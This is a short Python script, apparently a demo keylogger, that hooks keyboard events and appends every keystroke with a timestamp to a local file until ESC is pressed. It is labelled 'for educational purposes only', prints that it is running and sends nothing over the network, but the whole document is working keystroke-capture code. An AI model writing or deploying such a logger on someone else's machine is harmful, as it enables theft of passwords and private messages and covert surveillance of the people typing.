import keyboard
import time
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_key_press(event):
    try:
        with open(LOG_FILE, "a") as f:
            # Log timestamp + key pressed
            f.write(f"[{datetime.now()}] Key: {event.name}\n")
    except Exception as e:
        print(f"Error logging key: {e}")

def start_keylogger():
    print("Keylogger started (Educational Use Only). Press ESC to stop.")
    keyboard.on_press(on_key_press)
    
    # Block until ESC is pressed
    keyboard.wait('esc')
    
    print("\nKeylogger stopped. Log saved to:", LOG_FILE)

if __name__ == "__main__":
    print("*** DEMO KEYLOGGER - FOR EDUCATIONAL PURPOSES ONLY ***")
    print("This program records keystrokes in a file.")
    print("Press ESC to exit.\n")
    
    start_keylogger()
